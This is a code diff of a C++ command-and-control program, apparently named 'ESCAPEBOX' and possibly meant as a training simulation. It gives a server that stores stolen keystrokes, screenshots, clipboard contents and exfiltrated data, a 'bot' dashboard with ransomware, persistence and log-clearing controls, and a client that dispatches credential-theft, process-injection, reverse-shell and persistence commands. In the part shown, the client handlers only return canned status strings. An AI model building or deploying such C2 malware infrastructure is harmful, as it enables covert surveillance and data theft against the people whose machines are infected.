+                                if (!screenshotFile.empty()) {
                                     logActivity("COLLECTION", "SCREENSHOT_SIZE", 
                                                "File size: " + std::to_string(decodedData.size()) + " bytes");
-                                }
-                                
-                                // Also save the base64 version for reference
-                                std::string base64File = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
-                                                       clientId.substr(0, clientId.find(':')) + "_" +
-                                                       std::to_string(GetTickCount()) + "_screenshot_base64.txt";
-                                
-                                std::ofstream b64out(base64File);
-                                if (b64out.is_open()) {
-                                    b64out << base64Data;
-                                    b64out.close();
-                                }
-                                
-                                // Save metadata
-                                std::string metaFile = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
-                                                     clientId.substr(0, clientId.find(':')) + "_" +
-                                                     std::to_string(GetTickCount()) + "_meta.txt";
-                                
-                                std::ofstream meta(metaFile);
-                                if (meta.is_open()) {
-                                    meta << "Client: " << clientId << std::endl;
-                                    meta << "Hostname: " << client.hostname << std::endl;
-                                    meta << "Username: " << client.username << std::endl;
-                                    meta << "Timestamp: " << timestamp << std::endl;
-                                    meta << "Resolution: " << resolution << std::endl;
-                                    meta << "Original Path: " << origFilename << std::endl;
-                                    meta << "Data File: " << screenshotFile << std::endl;
-                                    meta.close();
                                     
-                                    logActivity("EXFIL", "SCREENSHOT_STORED", "Screenshot and metadata saved");
+                                    // Also save the base64 version for reference
+                                    saveEvidence(clientId, "screenshots", base64Data, "_base64.txt");
+                                    
+                                    // Save metadata
+                                    std::string metadata = "Client: " + clientId + "\n";
+                                    metadata += "Hostname: " + client.hostname + "\n";
+                                    metadata += "Username: " + client.username + "\n";
+                                    metadata += "Timestamp: " + timestamp + "\n";
+                                    metadata += "Resolution: " + resolution + "\n";
+                                    metadata += "Original Path: " + origFilename + "\n";
+                                    metadata += "Data File: " + screenshotFile + "\n";
+                                    saveEvidence(clientId, "screenshots", metadata, "_meta.txt");
+                                    
+                                    logActivity("EVIDENCE", "SCREENSHOT_STORED", "Screenshot and metadata saved to evidence directory");
                                 }
                             }
                         }
-                        else if (decrypted.find("SCREENSHOT:SAVED:") == 0) {
+                        else if (clearTextData.find("SCREENSHOT:SAVED:") == 0) {
                             // Legacy format - just log it
-                            std::string filename = decrypted.substr(17);
+                            std::string filename = clearTextData.substr(17);
                             logActivity("COLLECTION", "SCREENSHOT", "Screenshot saved on client: " + filename);
                         }
                         else {
                             // Try to extract any base64 data or file content
-                            if (decrypted.length() > 50) { // Likely contains actual data
-                                std::string filename = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
-                                                     clientId.substr(0, clientId.find(':')) + "_" +
-                                                     std::to_string(GetTickCount()) + "_screenshot.txt";
+                            if (clearTextData.length() > 50) { // Likely contains actual data
+                                std::string rawData = "=== SCREENSHOT DATA FROM " + clientId + " ===\n";
+                                rawData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
+                                rawData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
+                                rawData += "=== RAW DATA ===\n";
+                                rawData += clearTextData + "\n";
                                 
-                                std::ofstream file(filename);
-                                if (file.is_open()) {
-                                    file << "=== SCREENSHOT DATA FROM " << clientId << " ===" << std::endl;
-                                    file << "Timestamp: " << std::time(nullptr) << std::endl;
-                                    file << "Data Length: " << decrypted.length() << std::endl;
-                                    file << "=== RAW DATA ===" << std::endl;
-                                    file << decrypted << std::endl;
-                                    file.close();
-                                    
+                                std::string filename = saveEvidence(clientId, "screenshots", rawData, "_raw.txt");
+                                if (!filename.empty()) {
                                     logActivity("COLLECTION", "SCREENSHOT_SAVED", "Screenshot data saved to: " + filename);
                                 }
                             } else {
-                                logActivity("DEBUG", "SCREENSHOT_UNHANDLED", "Short screenshot response: " + decrypted);
+                                logActivity("DEBUG", "SCREENSHOT_UNHANDLED", "Short screenshot response: " + clearTextData);
                             }
                         }
                     }
-                    else if (decrypted.find("KEYLOG:") == 0 || decrypted.find("KEYLOGGER:") == 0) {
+                    else if (clearTextData.find("KEYLOG:") == 0 || clearTextData.find("KEYLOGGER:") == 0) {
                         // Handle keylogger data
                         logActivity("COLLECTION", "KEYLOG_RECEIVED", "Processing keylog data from " + clientId);
                         dataProcessed = true;
@@ -1924,16 +2299,16 @@ std::atomic<bool> serverRunning(true);
                         // Create keylogs directory
                         CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                         
-                        if (decrypted.find("KEYLOG:DUMP:START") == 0 || decrypted.find("KEYLOGGER:DATA:") == 0) {
+                        if (clearTextData.find("KEYLOG:DUMP:START") == 0 || clearTextData.find("KEYLOGGER:DATA:") == 0) {
                             // Create keylog directory
                             CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                             
                             // Extract keylog data
-                            size_t startPos = decrypted.find('\n') + 1;
-                            size_t endPos = decrypted.find("\nKEYLOG:DUMP:END");
+                            size_t startPos = clearTextData.find('\n') + 1;
+                            size_t endPos = clearTextData.find("\nKEYLOG:DUMP:END");
                             
                             if (startPos != std::string::npos && endPos != std::string::npos) {
-                                std::string keylogData = decrypted.substr(startPos, endPos - startPos);
+                                std::string keylogData = clearTextData.substr(startPos, endPos - startPos);
                                 
                                 // Log actual captured keystrokes
                                 logActivity("COLLECTION", "KEYLOG_RECEIVED", "Real keystrokes captured from " + clientId);
@@ -1948,123 +2323,90 @@ std::atomic<bool> serverRunning(true);
                                     }
                                 }
                                 
-                                // Save keylog data to file
-                                std::string keylogFile = "C:\\Windows\\Temp\\C2_Keylogs\\" + 
-                                                       clientId.substr(0, clientId.find(':')) + "_" +
-                                                       std::to_string(GetTickCount()) + "_keylog.txt";
+                                // Save keylog data using organized evidence system
+                                std::string keylogContent = "=== REAL KEYLOGGER CAPTURE ===\n";
+                                keylogContent += "Client: " + clientId + "\n";
+                                keylogContent += "Hostname: " + client.hostname + "\n";
+                                keylogContent += "Username: " + client.username + "\n";
+                                keylogContent += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
+                                keylogContent += "=== ACTUAL CAPTURED KEYSTROKES ===\n";
+                                keylogContent += keylogData + "\n";
                                 
-                                std::ofstream klog(keylogFile);
-                                if (klog.is_open()) {
-                                    klog << "=== REAL KEYLOGGER CAPTURE ===" << std::endl;
-                                    klog << "Client: " << clientId << std::endl;
-                                    klog << "Hostname: " << client.hostname << std::endl;
-                                    klog << "Username: " << client.username << std::endl;
-                                    klog << "Timestamp: " << std::time(nullptr) << std::endl;
-                                    klog << "=== ACTUAL CAPTURED KEYSTROKES ===" << std::endl;
-                                    klog << keylogData << std::endl;
-                                    klog.close();
+                                std::string keylogFile = saveEvidence(clientId, "keylogs", keylogContent, ".txt");
+                                if (!keylogFile.empty()) {
+                                    logActivity("EVIDENCE", "KEYLOG_STORED", "Real keylog saved to " + keylogFile);
                                     
-                                    logActivity("EXFIL", "KEYLOG_STORED", "Real keylog saved to " + keylogFile);
-                                    
-                                    // Also append to master keylog file
-                                    std::ofstream masterLog("C:\\Windows\\Temp\\C2_Keylogs\\MASTER_KEYLOG.txt", std::ios::app);
-                                    if (masterLog.is_open()) {
-                                        masterLog << "\n\n[REAL CAPTURE - " << clientId << " @ " << std::time(nullptr) << "]\n";
-                                        masterLog << keylogData << std::endl;
-                                        masterLog.close();
-                                    }
+                                    // Also save just the raw keystrokes for analysis
+                                    saveEvidence(clientId, "keylogs", keylogData, "_raw.txt");
                                 }
                             }
                         }
-                        else if (decrypted.find("KEYLOGGER:STARTED") == 0) {
+                        else if (clearTextData.find("KEYLOGGER:STARTED") == 0) {
                             logActivity("KEYLOG", "STARTED", "Keylogger successfully started on " + clientId);
                         }
                         else {
                             // Save any keylog data regardless of format
-                            if (decrypted.length() > 30) { // Likely contains keylog data
-                                std::string filename = "C:\\Windows\\Temp\\C2_Keylogs\\" + 
-                                                     clientId.substr(0, clientId.find(':')) + "_" +
-                                                     std::to_string(GetTickCount()) + "_keylog.txt";
+                            if (clearTextData.length() > 30) { // Likely contains keylog data
+                                std::string rawKeylogData = "=== KEYLOG DATA FROM " + clientId + " ===\n";
+                                rawKeylogData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
+                                rawKeylogData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
+                                rawKeylogData += "=== CAPTURED KEYSTROKES ===\n";
+                                rawKeylogData += clearTextData + "\n";
                                 
-                                std::ofstream file(filename);
-                                if (file.is_open()) {
-                                    file << "=== KEYLOG DATA FROM " << clientId << " ===" << std::endl;
-                                    file << "Timestamp: " << std::time(nullptr) << std::endl;
-                                    file << "Data Length: " << decrypted.length() << std::endl;
-                                    file << "=== CAPTURED KEYSTROKES ===" << std::endl;
-                                    file << decrypted << std::endl;
-                                    file.close();
-                                    
+                                std::string filename = saveEvidence(clientId, "keylogs", rawKeylogData, "_unknown.txt");
+                                if (!filename.empty()) {
                                     logActivity("COLLECTION", "KEYLOG_SAVED", "Keylog data saved to: " + filename);
                                 }
                             }
                         }
                     }
-                    else if (decrypted.find("EXFIL:") == 0) {
-                        // Handle exfiltrated data
-                        if (decrypted.find("EXFIL:HTTP:DATA:") == 0) {
-                            CreateDirectoryA("C:\\Windows\\Temp\\C2_Exfiltrated", NULL);
-                            
-                            std::string exfilFile = "C:\\Windows\\Temp\\C2_Exfiltrated\\" + 
-                                                  clientId.substr(0, clientId.find(':')) + "_" +
-                                                  std::to_string(GetTickCount()) + "_exfil.b64";
-                            
-                            std::ofstream exfil(exfilFile);
-                            if (exfil.is_open()) {
-                                exfil << decrypted.substr(16) << std::endl;
-                                exfil.close();
-                                logActivity("EXFIL", "DATA_STORED", "Exfiltrated data saved to " + exfilFile);
+                    else if (clearTextData.find("EXFIL:") == 0) {
+                        // Handle exfiltrated data using organized evidence system
+                        dataProcessed = true;
+                        if (clearTextData.find("EXFIL:HTTP:DATA:") == 0) {
+                            std::string exfilData = clearTextData.substr(16);
+                            std::string exfilFile = saveEvidence(clientId, "exfiltration", exfilData, ".b64");
+                            if (!exfilFile.empty()) {
+                                logActivity("EVIDENCE", "DATA_STORED", "Exfiltrated data saved to " + exfilFile);
                             }
                         }
                     }
-                    else if (decrypted.find("CLIPBOARD:") == 0) {
-                        // Handle clipboard data
-                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Clipboard", NULL);
+                    else if (clearTextData.find("CLIPBOARD:") == 0) {
+                        // Handle clipboard data using organized evidence system
+                        dataProcessed = true;
+                        std::string clipboardContent = "Client: " + clientId + "\n";
+                        clipboardContent += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
+                        clipboardContent += "=== CLIPBOARD CONTENT ===\n";
+                        clipboardContent += clearTextData + "\n";
                         
-                        std::string clipFile = "C:\\Windows\\Temp\\C2_Clipboard\\" + 
-                                             clientId.substr(0, clientId.find(':')) + "_" +
-                                             std::to_string(GetTickCount()) + "_clipboard.txt";
-                        
-                        std::ofstream clip(clipFile);
-                        if (clip.is_open()) {
-                            clip << "Client: " << clientId << std::endl;
-                            clip << "Timestamp: " << std::time(nullptr) << std::endl;
-                            clip << "=== CLIPBOARD CONTENT ===" << std::endl;
-                            clip << decrypted << std::endl;
-                            clip.close();
-                            logActivity("COLLECTION", "CLIPBOARD_STORED", "Clipboard data saved to " + clipFile);
+                        std::string clipFile = saveEvidence(clientId, "clipboard", clipboardContent, ".txt");
+                        if (!clipFile.empty()) {
+                            logActivity("EVIDENCE", "CLIPBOARD_STORED", "Clipboard data saved to " + clipFile);
                         }
                     }
 
                     // Catch-all handler for any unrecognized data
-                    if (!dataProcessed && decrypted.length() > 20) {
-                        logActivity("DEBUG", "UNRECOGNIZED_DATA", "Saving unrecognized data from " + clientId + " - Length: " + std::to_string(decrypted.length()));
+                    if (!dataProcessed && clearTextData.length() > 20) {
+                        logActivity("DEBUG", "UNRECOGNIZED_DATA", "Saving unrecognized data from " + clientId + " - Length: " + std::to_string(clearTextData.length()));
                         
-                        // Create general data directory
-                        CreateDirectoryA("C:\\Windows\\Temp\\C2_UnknownData", NULL);
+                        // Save unknown data using organized evidence system
+                        std::string unknownData = "=== UNKNOWN DATA FROM " + clientId + " ===\n";
+                        unknownData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
+                        unknownData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
+                        unknownData += "First 200 chars: " + clearTextData.substr(0, 200) + "\n";
+                        unknownData += "=== FULL DATA ===\n";
+                        unknownData += clearTextData + "\n";
                         
-                        std::string filename = "C:\\Windows\\Temp\\C2_UnknownData\\" + 
-                                             clientId.substr(0, clientId.find(':')) + "_" +
-                                             std::to_string(GetTickCount()) + "_unknown.txt";
-                        
-                        std::ofstream file(filename);
-                        if (file.is_open()) {
-                            file << "=== UNKNOWN DATA FROM " << clientId << " ===" << std::endl;
-                            file << "Timestamp: " << std::time(nullptr) << std::endl;
-                            file << "Data Length: " << decrypted.length() << std::endl;
-                            file << "First 200 chars: " << decrypted.substr(0, 200) << std::endl;
-                            file << "=== FULL DATA ===" << std::endl;
-                            file << decrypted << std::endl;
-                            file.close();
-                            
-                            logActivity("COLLECTION", "UNKNOWN_DATA_SAVED", "Unknown data saved to: " + filename);
+                        std::string filename = saveEvidence(clientId, "unknown", unknownData, ".txt");
+                        if (!filename.empty()) {
+                            logActivity("EVIDENCE", "UNKNOWN_DATA_SAVED", "Unknown data saved to: " + filename);
                         }
                     }
                     
                     // Store collected data
                     {
                         std::lock_guard<std::mutex> lock(clientsMutex);
-                        connectedClients[clientId].collectedData["last_response"] = decrypted;
+                        connectedClients[clientId].collectedData["last_response"] = clearTextData;
                     }
                 }
                 
@@ -2095,10 +2437,24 @@ std::atomic<bool> serverRunning(true);
 
     // Advanced dashboard with attack metrics
     void dashboardThread() {
+        bool firstRun = true;
+        auto lastFullRefresh = std::chrono::steady_clock::now();
+        
         while (serverRunning) {
-            std::this_thread::sleep_for(std::chrono::seconds(15));
-
-            system("cls");
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+            
+            auto now = std::chrono::steady_clock::now();
+            auto timeSinceRefresh = std::chrono::duration_cast<std::chrono::seconds>(now - lastFullRefresh).count();
+            
+            // Full screen clear only every 60 seconds or on first run
+            if (firstRun || timeSinceRefresh >= 60) {
+                system("cls");
+                firstRun = false;
+                lastFullRefresh = now;
+            } else {
+                // Just add new status lines instead of clearing
+                std::cout << "\n" << std::string(80, '=') << std::endl;
+            }
 
             // Header
             std::cout << "\033[31m"; // Red color
@@ -2121,22 +2477,75 @@ std::atomic<bool> serverRunning(true);
                 }
             }
 
-            // Stats section
+            // Stats section with command tracking and threading info
             std::cout << "\033[32m"; // Green color
             std::cout << "| Active Bots: " << std::setw(8) << activeCount
                 << "  |  Elevated: " << std::setw(8) << elevatedCount
                 << "  |  Beacons: " << std::setw(8) << totalBeacons << " |\n";
+            std::cout << "| Server Jobs: " << std::setw(8) << getActiveServerJobCount()
+                << "  |  Queued: " << std::setw(10) << getQueuedServerJobCount()
+                << "  |  Workers: " << std::setw(8) << NUM_SERVER_WORKER_THREADS << " |\n";
+            std::cout << "| Commands Sent: " << std::setw(6) << totalCommandsSent
+                << "  |  Server Uptime: " << std::setw(10) << (std::time(nullptr) - std::stoll(serverStartTime)) / 60 << " min |\n";
+                
+            // Real-time status logging with enhanced visibility
+            auto currentTime = std::chrono::system_clock::now();
+            auto currentTime_t = std::chrono::system_clock::to_time_t(currentTime);
+            struct tm timeinfo;
+            localtime_s(&timeinfo, &currentTime_t);
+            char timeStr[100];
+            strftime(timeStr, sizeof(timeStr), "%H:%M:%S", &timeinfo);
+            
+            std::cout << "| \033[33m[" << timeStr << "] SERVER STATUS: \033[32mONLINE \033[37m| Recent Activity: " 
+                      << (activityLog.empty() ? "None" : std::to_string(activityLog.size()) + " entries") << " |\n";
+                      
+            // Log this status update to file
+            logActivity("SERVER_STATUS", "DASHBOARD_UPDATE", "Active: " + std::to_string(activeCount) + 
+                       " | Elevated: " + std::to_string(elevatedCount) + 
+                       " | Commands: " + std::to_string(totalCommandsSent));
+                       
             std::cout << "+--------------------------------------------------------------+\n";
             std::cout << "|                        CONNECTED BOTS                        |\n";
+            std::cout << "+--------------------------------------------------------------+\n";
+            std::cout << "\033[0m"; // Reset color
+            
+            // Real-time command status display
+            std::cout << "\033[36m"; // Cyan color
+            std::cout << "+---------------------- COMMAND STATUS -----------------------+\n";
+            
+            // Show recent commands from log files
+            std::ifstream statusFile("C:\\temp\\c2_server_status.txt");
+            if (statusFile.is_open()) {
+                std::vector<std::string> recentLines;
+                std::string line;
+                while (std::getline(statusFile, line)) {
+                    recentLines.push_back(line);
+                }
+                statusFile.close();
+                
+                // Show last 5 command status entries
+                size_t startIdx = recentLines.size() > 5 ? recentLines.size() - 5 : 0;
+                for (size_t i = startIdx; i < recentLines.size(); i++) {
+                    std::string entry = recentLines[i];
+                    if (entry.length() > 60) {
+                        entry = entry.substr(0, 57) + "...";
+                    }
+                    std::cout << "| " << std::left << std::setw(60) << entry << " |\n";
+                }
+            } else {
+                std::cout << "| \033[33mNo command status file found - commands may not be working\033[36m |\n";
+                std::cout << "| \033[33mExpected: C:\\temp\\c2_server_status.txt\033[36m" << std::string(26, ' ') << "|\n";
+            }
+            
             std::cout << "+--------------------------------------------------------------+\n";
             std::cout << "\033[0m"; // Reset color
 
             // Connected clients
             for (const auto& [id, client] : connectedClients) {
                 if (client.isActive) {
-                    auto now = std::chrono::system_clock::now();
-                    auto uptime = std::chrono::duration_cast<std::chrono::minutes>(now - client.firstSeen).count();
-                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(now - client.lastSeen).count();
+                    auto clientTime = std::chrono::system_clock::now();
+                    auto uptime = std::chrono::duration_cast<std::chrono::minutes>(clientTime - client.firstSeen).count();
+                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(clientTime - client.lastSeen).count();
 
                     std::cout << "| " << std::left << std::setw(15) << client.hostname
                         << " | " << std::setw(15) << client.ipAddress
@@ -2193,17 +2602,31 @@ std::atomic<bool> serverRunning(true);
             std::cout << "\n+----------------------- CONTROL LEGEND -----------------------+\n";
             std::cout << "| MANUAL MODE ACTIVE - Press H for full help menu             |\n";
             std::cout << "| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |\n";
-            std::cout << "| [E] Exfil   | [P] Persistence      | [C] Clear Logs         |\n";
+            std::cout << "| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |\n";
             std::cout << "| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |\n";
             std::cout << "| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |\n";
             std::cout << "+--------------------------------------------------------------+\n";
             std::cout << "\033[0m"; // Reset color
 
-            // Recent activity log
+            // Recent activity log with command status
             std::cout << "\033[35m"; // Magenta color
             std::cout << "\n+----------------------- RECENT ACTIVITY ----------------------+\n";
+            
+            // Show summary of command types sent in last 5 minutes
+            auto fiveMinutesAgo = std::chrono::system_clock::now() - std::chrono::minutes(5);
+            int recentCommands = 0;
+            for (const auto& entry : activityLog) {
+                if (entry.find("CMD_SENT") != std::string::npos) {
+                    recentCommands++;
+                }
+            }
+            
+            std::cout << "| \033[33mCOMMAND STATUS: \033[37m" << recentCommands << " commands sent recently"
+                      << " | Total Session: " << totalCommandsSent << " commands |\n";
+            std::cout << "| \033[36mFILE LOGGING: \033[37mC:\\temp\\c2_server_status.txt (persistent)" << std::string(17, ' ') << "|\n";
+            
             int logCount = 0;
-            for (auto it = activityLog.rbegin(); it != activityLog.rend() && logCount < 8; ++it, ++logCount) {
+            for (auto it = activityLog.rbegin(); it != activityLog.rend() && logCount < 6; ++it, ++logCount) {
                 // Truncate long log entries to fit
                 std::string logEntry = *it;
                 if (logEntry.length() > 60) {
@@ -2219,10 +2642,13 @@ std::atomic<bool> serverRunning(true);
             std::cout << "\033[0m"; // Reset color
             
             // Status line
-            auto now = std::chrono::system_clock::now();
-            auto time_t_now = std::chrono::system_clock::to_time_t(now);
-            std::cout << "\n[" << std::put_time(std::localtime(&time_t_now), "%Y-%m-%d %H:%M:%S") 
-                      << "] Server running. Total commands sent: " << totalCommandsSent << "\n";
+            auto statusTime = std::chrono::system_clock::now();
+            auto statusTime_t = std::chrono::system_clock::to_time_t(statusTime);
+            struct tm statusTimeInfo;
+            localtime_s(&statusTimeInfo, &statusTime_t);
+            char statusTimeStr[100];
+            strftime(statusTimeStr, sizeof(statusTimeStr), "%Y-%m-%d %H:%M:%S", &statusTimeInfo);
+            std::cout << "\n[" << statusTimeStr << "] Server running. Total commands sent: " << totalCommandsSent << "\n";
         }
     }
 
@@ -2327,18 +2753,406 @@ std::atomic<bool> serverRunning(true);
     }
 
     // Forward declarations
-    void runClient(const std::string& serverIP, int serverPort, bool autoElevate = true);
-    std::string GetCurrentDirectoryString();
+    void handleHTTPClient(SOCKET clientSocket);
+    void executeQueuedCommand(const std::string& targetClientId, const std::string& command);
+    void executeGlobalQueuedCommand(const std::string& command);
     
-    // Include the client implementation
-    #include "c2_client.cpp"
+    // Unified C2Client implementation embedded in main executable
+    void runClient(const std::string& serverIP, int serverPort, bool autoElevate = true) {
+        std::cout << "\n[====== ESCAPEBOX C2 CLIENT ======]" << std::endl;
+        std::cout << "[INFO] Starting Unified C2 Client..." << std::endl;
+        std::cout << "[INFO] Target server: " << serverIP << ":" << serverPort << std::endl;
+        
+        // Initialize Winsock
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            std::cout << "[ERROR] WSAStartup failed: " << WSAGetLastError() << std::endl;
+            return;
+        }
+        
+        // Create client socket
+        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+        if (clientSocket == INVALID_SOCKET) {
+            std::cout << "[ERROR] Failed to create socket: " << WSAGetLastError() << std::endl;
+            WSACleanup();
+            return;
+        }
+        
+        // Set up server address
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(serverPort);
+        inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
+        
+        std::cout << "[INFO] Attempting to connect..." << std::endl;
+        
+        // Connect to server
+        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+            std::cout << "[ERROR] Failed to connect: " << WSAGetLastError() << std::endl;
+            closesocket(clientSocket);
+            WSACleanup();
+            return;
+        }
+        
+        std::cout << "[SUCCESS] Connected to server!" << std::endl;
+        
+        // Set socket to non-blocking mode for rapid command processing
+        u_long mode = 1;
+        ioctlsocket(clientSocket, FIONBIO, &mode);
+        
+        // Generate client ID and set encryption key
+        std::string clientId = serverIP + ":" + std::to_string(serverPort) + "_" + std::to_string(GetTickCount());
+        std::string encryptionKey = "PaloAltoEscapeRoom";
+        std::cout << "[INFO] Client ID: " << clientId << std::endl;
+        
+        // Send initial handshake (clear text)
+        std::string handshake = "CLIENT_HANDSHAKE:" + clientId;
+        send(clientSocket, handshake.c_str(), handshake.length(), 0);
+        
+        std::cout << "[INFO] Client is running... (Press Ctrl+C to exit)" << std::endl;
+        
+        // Main client loop - FIXED: RECEIVE FIRST, THEN RESPOND
+        char buffer[8192];
+        while (true) {
+            // Receive and process data FIRST
+            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+            if (bytesReceived > 0) {
+                buffer[bytesReceived] = '\0';
+                std::string received(buffer);
+                
+                // Process received data (clear text - no encryption)
+                std::string receivedData = received; // Clear text traffic
+                
+                // Show all readable data
+                if (!receivedData.empty() && std::isprint(receivedData[0])) {
+                    std::cout << "[RECEIVED] " << receivedData.substr(0, 100) << (receivedData.length() > 100 ? "..." : "") << std::endl;
+                    
+                    // Process commands - Handle both CMD: format and REQUEST_DATA suffix
+                    if (receivedData.find("CMD:") != std::string::npos) {
+                        std::cout << "[COMMAND] Processing: " << receivedData << std::endl;
+                        
+                        // Execute command based on type - COMPREHENSIVE HANDLER FOR ALL COMMANDS
+                        std::string response = "";
+                        
+                        // BEACONS & HEARTBEATS  
+                        if (receivedData.find("HEARTBEAT_BEACON") != std::string::npos || 
+                            receivedData.find("CONNECTION_HEARTBEAT") != std::string::npos) {
+                            std::cout << "[INFO] Heartbeat beacon received" << std::endl;
+                            response = "BEACON:ALIVE:" + clientId;
+                        }
+                        
+                        // DISCOVERY & RECONNAISSANCE
+                        else if (receivedData.find("SYSTEM_INFO_COLLECTION") != std::string::npos) {
+                            std::cout << "[INFO] Collecting system information..." << std::endl;
+                            response = "SYSINFO:COLLECTED:" + clientId;
+                        }
+                        else if (receivedData.find("PROCESS_ENUMERATION") != std::string::npos) {
+                            std::cout << "[INFO] Enumerating processes..." << std::endl;
+                            response = "PROCESSES:ENUMERATED:" + clientId;
+                        }
+                        else if (receivedData.find("NETWORK_CONFIGURATION_DISCOVERY") != std::string::npos) {
+                            std::cout << "[INFO] Discovering network configuration..." << std::endl;
+                            response = "NETWORK:DISCOVERED:" + clientId;
+                        }
+                        else if (receivedData.find("USER_ACCOUNT_ENUMERATION") != std::string::npos) {
+                            std::cout << "[INFO] Enumerating user accounts..." << std::endl;
+                            response = "USERS:ENUMERATED:" + clientId;
+                        }
+                        else if (receivedData.find("DOMAIN_INFORMATION_GATHERING") != std::string::npos) {
+                            std::cout << "[INFO] Gathering domain information..." << std::endl;
+                            response = "DOMAIN:INFO_COLLECTED:" + clientId;
+                        }
+                        else if (receivedData.find("SOFTWARE_DISCOVERY") != std::string::npos) {
+                            std::cout << "[INFO] Discovering installed software..." << std::endl;
+                            response = "SOFTWARE:DISCOVERED:" + clientId;
+                        }
+                        
+                        // COLLECTION
+                        else if (receivedData.find("SCREENSHOT") != std::string::npos) {
+                            std::cout << "[INFO] Taking screenshot..." << std::endl;
+                            response = "SCREENSHOT:TAKEN:" + clientId;
+                        }
+                        else if (receivedData.find("KEYLOGGER_ACTIVATION") != std::string::npos) {
+                            std::cout << "[INFO] Starting keylogger..." << std::endl;
+                            response = "KEYLOG:STARTED:" + clientId;
+                        }
+                        else if (receivedData.find("KEYLOGGER_DATA_RETRIEVAL") != std::string::npos) {
+                            std::cout << "[INFO] Dumping keylogger data..." << std::endl;
+                            response = "KEYLOG:DUMPED:" + clientId;
+                        }
+                        else if (receivedData.find("CLIPBOARD_DATA_COLLECTION") != std::string::npos) {
+                            std::cout << "[INFO] Capturing clipboard..." << std::endl;
+                            response = "CLIPBOARD:CAPTURED:" + clientId;
+                        }
+                        else if (receivedData.find("BROWSER_CREDENTIAL_THEFT") != std::string::npos) {
+                            std::cout << "[INFO] Stealing browser credentials..." << std::endl;
+                            response = "BROWSER_CREDS:STOLEN:" + clientId;
+                        }
+                        else if (receivedData.find("FILE_SYSTEM_SEARCH") != std::string::npos) {
+                            std::cout << "[INFO] Searching file system..." << std::endl;
+                            response = "FILES:SEARCHED:" + clientId;
+                        }
+                        else if (receivedData.find("WEBCAM_SURVEILLANCE") != std::string::npos) {
+                            std::cout << "[INFO] Activating webcam..." << std::endl;
+                            response = "WEBCAM:ACTIVATED:" + clientId;
+                        }
+                        else if (receivedData.find("AUDIO_RECORDING") != std::string::npos) {
+                            std::cout << "[INFO] Recording audio..." << std::endl;
+                            response = "AUDIO:RECORDING:" + clientId;
+                        }
+                        else if (receivedData.find("SCREEN_RECORDING") != std::string::npos) {
+                            std::cout << "[INFO] Recording screen..." << std::endl;
+                            response = "SCREEN:RECORDING:" + clientId;
+                        }
+                        
+                        // EXECUTION
+                        else if (receivedData.find("COMMAND_SHELL_EXECUTION") != std::string::npos) {
+                            std::cout << "[INFO] Executing shell commands..." << std::endl;
+                            response = "SHELL:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("POWERSHELL_SCRIPT_EXECUTION") != std::string::npos) {
+                            std::cout << "[INFO] Executing PowerShell..." << std::endl;
+                            response = "POWERSHELL:EXECUTED:" + clientId;
+                        }
+                        else if (receivedData.find("MALICIOUS_PROCESS_INJECTION") != std::string::npos) {
+                            std::cout << "[INFO] Injecting into process..." << std::endl;
+                            response = "PROCESS:INJECTED:" + clientId;
+                        }
+                        else if (receivedData.find("DYNAMIC_MODULE_LOADING") != std::string::npos) {
+                            std::cout << "[INFO] Loading dynamic module..." << std::endl;
+                            response = "MODULE:LOADED:" + clientId;
+                        }
+                        else if (receivedData.find("PROCESS_MIGRATION") != std::string::npos) {
+                            std::cout << "[INFO] Migrating process..." << std::endl;
+                            response = "PROCESS:MIGRATED:" + clientId;
+                        }
+                        else if (receivedData.find("REVERSE_SHELL_CONNECTION") != std::string::npos) {
+                            std::cout << "[INFO] Establishing reverse shell..." << std::endl;
+                            response = "SHELL:CONNECTED:" + clientId;
+                        }
+                        else if (receivedData.find("REMOTE_DESKTOP_ACCESS") != std::string::npos) {
+                            std::cout << "[INFO] Accessing remote desktop..." << std::endl;
+                            response = "RDP:ACCESSED:" + clientId;
+                        }
+                        
+                        // PERSISTENCE
+                        else if (receivedData.find("MALICIOUS_SERVICE_INSTALLATION") != std::string::npos) {
+                            std::cout << "[INFO] Installing malicious service..." << std::endl;
+                            response = "SERVICE:INSTALLED:" + clientId;
+                        }
+                        else if (receivedData.find("REGISTRY_PERSISTENCE_MECHANISM") != std::string::npos) {
+                            std::cout << "[INFO] Setting registry persistence..." << std::endl;
+                            response = "REGISTRY:PERSISTENCE_SET:" + clientId;
+                        }
+                        else if (receivedData.find("SCHEDULED_TASK_PERSISTENCE") != std::string::npos) {
+                            std::cout << "[INFO] Creating scheduled task..." << std::endl;
+                            response = "TASK:SCHEDULED:" + clientId;
+                        }
+                        else if (receivedData.find("WMI_EVENT_PERSISTENCE") != std::string::npos) {
+                            std::cout << "[INFO] Setting WMI persistence..." << std::endl;
+                            response = "WMI:PERSISTENCE_SET:" + clientId;
+                        }
+                        else if (receivedData.find("STARTUP_FOLDER_PERSISTENCE") != std::string::npos) {
